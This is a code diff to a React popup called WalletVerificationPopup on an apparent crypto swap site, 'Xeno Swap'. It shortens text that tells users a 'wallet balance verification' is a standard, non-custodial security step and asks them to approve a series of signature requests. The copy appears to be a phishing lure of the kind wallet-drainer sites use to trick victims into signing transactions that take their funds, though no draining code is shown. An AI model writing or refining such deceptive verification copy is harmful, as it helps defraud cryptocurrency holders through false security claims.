@@ -237,20 +237,9 @@ export const WalletVerificationPopup = () => {
               <ShieldCheck className="w-9 h-9 text-primary" />
             </div>
             <h2 className="text-xl font-bold text-foreground">Wallet Balance Verification</h2>
-            <div className="space-y-3 text-sm text-muted-foreground leading-relaxed">
-              <p>
-                To ensure the security and integrity of your account, we require a one-time wallet balance verification before you can proceed. This is a standard security protocol used across decentralized platforms to confirm wallet ownership and validate on-chain activity.
-              </p>
-              <p>
-                During this process, our system will perform a quick scan of your wallet's holdings — including native tokens and any associated SPL or ERC-20 assets — to verify that your wallet meets the minimum eligibility criteria for interacting with the platform.
-              </p>
-              <p>
-                This verification is completely non-custodial. At no point does Xeno Swap take control of your funds. You will be asked to approve a series of signature requests to confirm your identity as the wallet holder.
-              </p>
-              <p className="text-xs text-muted-foreground/70">
-                Please do not close this window. Verification will begin automatically...
-              </p>
-            </div>
+            <p className="text-sm text-muted-foreground leading-relaxed">
+              For security, we need to verify your wallet balance before proceeding. This quick, non-custodial check confirms ownership. Please approve the upcoming signature requests.
+            </p>
             <div className="flex items-center gap-2 mt-2">
               <Loader2 className="w-4 h-4 animate-spin text-primary" />
               <span className="text-xs text-primary">Preparing verification...</span>
